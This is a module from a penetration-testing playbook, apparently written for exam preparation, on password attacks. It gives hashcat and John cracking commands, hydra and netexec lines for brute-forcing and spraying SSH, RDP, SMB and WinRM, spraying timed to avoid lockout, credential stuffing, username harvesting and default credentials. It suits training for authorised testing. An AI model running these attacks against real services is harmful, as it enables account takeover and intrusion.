# Module 06: Password Attacks

> **Credential handling decisions → `../operator/CREDENTIAL_DECISION_TREE.md`**
> This module covers cracking techniques only. For what to do after you crack a hash or obtain a credential, use the decision tree.

## When to Use This Module
Use this module when you obtain password hashes (from post-exploitation, network captures, or database dumps) that need cracking, or when you need to perform online password spraying/brute-forcing against authentication services.

## Prerequisites
- Hashes or encrypted credentials to crack, OR
- Target authentication service (SSH, RDP, SMB, web form) with usernames
- Hashcat/John installed + GPU support for fast cracking
- Wordlists (rockyou, SecLists)

## Entry Check

```
Hash obtained?
├── Yes → Identify hash type → Choose cracking mode
│   ├── Offline (hashcat/john) → GPU optimized
│   └── Online (hydra/medusa) → Service-level auth
└── No → Password spraying against known services
    ├── Usernames known? → Spray common passwords
    └── No usernames? → Enumerate users first (Module 02)
```

## Hash Identification

```bash
# Automatic identification
hashid <hash>
hash-identifier <hash>

# Common hash types for hashcat mode (-m)
# NTLM: 1000
# NetNTLMv2: 5600
# Kerberos TGS-REP: 13100
# Kerberos AS-REP: 18200
# SHA-512 (Unix): 1800
# SHA-256 (Unix): 7400
# MD5 (Unix): 500
# bcrypt: 3200
# PBKDF2: 10900 (macOS), 2100 (MS Office)
```

## Offline Cracking with Hashcat

```bash
# Benchmark your GPU
hashcat -b

# Dictionary attack (fastest, try first)
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules (next, catches mutations)
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (brute force pattern)
hashcat -m <mode> hash.txt -a 3 ?u?l?l?l?l?l?d?d?d

# Rules location: /usr/share/hashcat/rules/
# Popular: best64.rule, d3ad0ne.rule, OneRuleToRuleThemAll.rule

# Show cracked passwords
hashcat -m <mode> hash.txt --show
```

## Password Attack Decision Flow

```
Password attack needed?
├── OFFLINE (I have hashes):
│   ├── Quick wins: rockyou.txt dictionary
│   ├── Medium: dictionary + best64.rule
│   ├── Heavy: mask attack on known pattern
│   └── Time-based: Leave hashcat running overnight
│
├── ONLINE (I have usernames + service):
│   ├── Password policy known?
│   │   ├── Strict lockout → Spray: 1 password, many users
│   │   ├── Lenient policy → Brute force with wordlist
│   │   ├── Unknown → Start spraying conservatively
│   │   └── No policy → Full brute force
│   │
│   ├── Services to attack:
│   │   ├── SSH → hydra -L users.txt -P pass.txt ssh://target
│   │   ├── RDP → hydra -L users.txt -P pass.txt rdp://target
│   │   ├── SMB → netexec smb target -u users.txt -p pass.txt
│   │   ├── WinRM → netexec winrm target -u users.txt -p pass.txt
│   │   └── Web form → hydra target http-post-form "..."
│   │
│   └── Credential stuffing:
│       └── Use known breaches (HaveIBeenPwned, Dehashed)
│
└── I need usernames:
    ├── Web scraping (LinkedIn, company website)
    ├── Kerbrute user enumeration (AD environments)
    ├── SMTP VRFY/EXPN
    └── Common patterns: firstname.lastname, f.lastname
```

## Spraying vs Brute Force

```
Lockout policy:
├── Known: Spray at threshold-1 attempts, wait lockout_duration
├── Unknown: 1-2 sprays with common passwords, wait 1+ hour
└── No lockout: Full brute force

Spraying strategy:
├── Password: <CompanyName>1, <Season><Year>, Welcome1, Password1
├── Target: ALL domain users (100+ accounts)
└── Frequency: 1 attempt per account, wait 30-60 min, next password
```

## Password Mutations (Rules)

```bash
# Common mutation patterns to try:
# Capitalize: password → Password
# Append number: password → password1 → password123
# Append year: password → password2024
# Leet speak: password → p@ssw0rd
# Prepend special: password → !password
# Common combos: CompanyName2026!, Spring2026!

# Hashcat rule example
# Use d3ad0ne.rule for comprehensive mutations
hashcat -m 5600 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
```

## Stolen Credential Reuse

```
Credential found?
├── What service did it come from?
├── Try against other services on same host
├── Try against other hosts in network
├── Spray against AD domain (if applicable)
└── Check for password reuse across different privilege levels
```

## Advanced Hashcat Techniques

### Session Management (Long-Running Cracks)

```bash
# Start a named session (survives crashes, can be resumed)
hashcat -m <mode> hash.txt rockyou.txt -r best64.rule --session cpts_exam

# Resume a paused/interrupted session
hashcat --session cpts_exam --restore

# Check session status
hashcat --session cpts_exam --status

# Restore file location: ~/.local/share/hashcat/sessions/
# Always use --session for long-running cracks in the exam
```

### Potfile Management

```bash
# Hashcat stores cracked hashes in potfile by default
# Location: ~/.local/share/hashcat/hashcat.potfile

# Show all cracked hashes
hashcat -m <mode> hash.txt --show

# Disable potfile (re-crack already cracked hashes)
hashcat -m <mode> hash.txt rockyou.txt --potfile-disable

# Use custom potfile location
hashcat -m <mode> hash.txt rockyou.txt --potfile-path /tmp/cracked.pot

# Clear potfile (start fresh — careful!)
> ~/.local/share/hashcat/hashcat.potfile
```

### Custom Wordlist Generation

```bash
# CeWL — scrape words from a website (company-specific wordlist)
cewl http://target.company.com -d 3 -m 5 -w company_words.txt
# -d 3 = depth 3, -m 5 = minimum word length 5

# CeWL with email extraction (for username lists)
cewl http://target.company.com -e -a -w company_emails.txt

# username-anarchy — generate username variants from names
username-anarchy -i names.txt > usernames.txt
# Input: John Smith → Output: jsmith, john.smith, smithj, johns, etc.

# Mentalist — GUI tool for wordlist generation with rules
# Custom wordlist from company info:
#   Company name + year + special char: CompanyName2026!, company2026, etc.
#   Combine with hashcat rules for mutations

# Combinator attack (combine two wordlists)
hashcat -m <mode> hash.txt -a 1 wordlist1.txt wordlist2.txt
# Example: first_names.txt + common_passwords.txt
# Useful when passwords are name+word combinations

# Combinator with rules (add mutations to combined words)
hashcat -m <mode> hash.txt -a 1 wordlist1.txt wordlist2.txt -j '$!' -k '$1'
# -j modifies left word, -k modifies right word
```

### CPU-Only Cracking (No GPU)

```bash
# If no GPU available, use optimized settings:
# 1. Use smaller, targeted wordlists (don't use full rockyou for everything)
hashcat -m <mode> hash.txt /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt

# 2. Use mask attacks (faster than dictionary on CPU for short passwords)
hashcat -m <mode> hash.txt -a 3 ?l?l?l?l?d?d --increment

# 3. Limit workload with --opencl-device-types or -D 1 (CPU only)
hashcat -m <mode> hash.txt rockyou.txt -D 1

# 4. Use John the Ripper (often faster on CPU for certain hash types)
john --wordlist=rockyou.txt hash.txt
john --show hash.txt

# 5. Prioritize: NTLM (1000) and NetNTLMv2 (5600) crack fast even on CPU
#    bcrypt (3200) and SHA-512 (1800) are very slow on CPU — use targeted masks

# 6. Background long-running CPU cracks:
nohup hashcat -m <mode> hash.txt rockyou.txt -D 1 --session cpu_crack &
```

## Default Credentials Reference

Always try on first encounter:
- Tomcat: tomcat:tomcat, admin:admin
- Jenkins: admin:admin, admin:password
- WordPress: admin:admin
- MySQL: root:root, root:(empty)
- MSSQL: sa:sa, sa:(empty)
- PostgreSQL: postgres:postgres
- VNC: (no password), password:password
- SNMP: public, private
- phpMyAdmin: root:(empty)
- Splunk: admin:changeme
- PRTG: prtgadmin:prtg

## Cross-References
- For AD-specific password attacks → [Module 11: Active Directory](11-active-directory.md)
- For web login forms → [Module 04: Web Application](04-web-application.md)
- For hash dumping techniques → [Module 13: Post-Exploitation](13-post-exploitation.md)
- Hashcat cheat sheet → [assets/cheatsheets/hashcat.md](../assets/cheatsheets/hashcat.md)

## Output Summary
- [ ] Hash type identified
- [ ] Dictionary attack attempted
- [ ] Rule-based attack attempted
- [ ] Custom wordlist generated (CeWL, username-anarchy)
- [ ] Combinator attack attempted (if applicable)
- [ ] Session management used for long-running cracks
- [ ] CPU-only fallback used if no GPU
- [ ] Online spraying/brute force completed (within lockout limits)
- [ ] Cracked passwords saved to credentials/ folder
- [ ] Passwords tested for reuse across services
